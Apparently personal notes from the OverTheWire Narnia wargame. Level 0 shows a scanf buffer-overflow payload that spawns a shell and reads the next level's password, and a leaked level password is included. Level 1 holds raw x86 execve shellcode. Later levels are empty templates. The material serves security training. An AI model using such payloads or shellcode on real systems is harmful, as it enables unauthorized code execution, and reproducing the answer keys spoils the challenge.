## What we learned

- bufferoverflow with `scanf`: we can overwrite the stack if there is 
  discrepencies between array length and input (level0)
- we can find shellcode at [exploit-db](https://www.exploit-db.com/shellcodes/50751)


### Level 0

Flag: `narnia0`


%% --------------------------------------------------- 

### Level 0 -> Level 1

Goal: Buffer overflow with scanf


```
>>> ssh narnia0@narnia.labs.overthewire.org -p 2226

1. check what files does
>>> cat narnia0.c

int main(){
    long val=0x41414141;
    char buf[20];

    printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
    printf("Here is your chance: ");
    scanf("%24s",&buf);

    printf("buf: %s\n",buf);
    printf("val: 0x%08x\n",val);

    if(val==0xdeadbeef){
        setreuid(geteuid(),geteuid());
        system("/bin/sh");
    }
    else {
        printf("WAY OFF!!!!\n");
        exit(1);
    }

    return 0;
}

scanf takes 24 bytes, but buffer only stores 20 of them, so we can overwrite 
4 of them


2. buffer overflow
>>> (python2 -c 'print 20*"A" + "\xef\xbe\xad\xde"'; cat;) | ./narnia0

Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: AAAAAAAAAAAAAAAAAAAAﾭ�
val: 0xdeadbeef
whoami
narnia1
cat /etc/narnia_pass/narnia1
eaa6AjYMBB



```

Flag: `eaa6AjYMBB`


%% --------------------------------------------------- 

### Level 1 -> Level 2

Goal: Environment Exploit by setting shell code as EGG environment variable


```
>>> ssh narnia1@narnia.labs.overthewire.org -p 2226

shellcode used: "\x31\xc9\xf7\xe1\x51\xbf\xd0\xd0\x8c\x97\xbe\xd0\x9d\x96\x91\xf7\xd7\xf7\xd6\x57\x56\x89\xe3\xb0\x0b\xcd\x80";
"\x25\xa4\xff\xfd"


```

Flag: ``

%% --------------------------------------------------- 

### Level 2 -> Level 3

Goal: 


```
>>> ssh narnia2@narnia.labs.overthewire.org -p 2226

```

Flag: ``


%% --------------------------------------------------- 

### Level 3 -> Level 4

Goal: 


```
>>> ssh narnia3@narnia.labs.overthewire.org -p 2226

```

Flag: ``


%% --------------------------------------------------- 

### Level 4 -> Level 5

Goal: 


```
>>> ssh narnia4@narnia.labs.overthewire.org -p 2226

```

Flag: ``


%% --------------------------------------------------- 

### Level 5 -> Level 6

Goal: 


```
>>> ssh narnia5@narnia.labs.overthewire.org -p 2226

```

Flag: ``


%% --------------------------------------------------- 

### Level 6 -> Level 7

Goal: 


```
>>> ssh narnia6@narnia.labs.overthewire.org -p 2226

```

Flag: ``


%% --------------------------------------------------- 

### Level 7 -> Level 8

Goal: 


```
>>> ssh narnia7@narnia.labs.overthewire.org -p 2226

```

Flag: ``


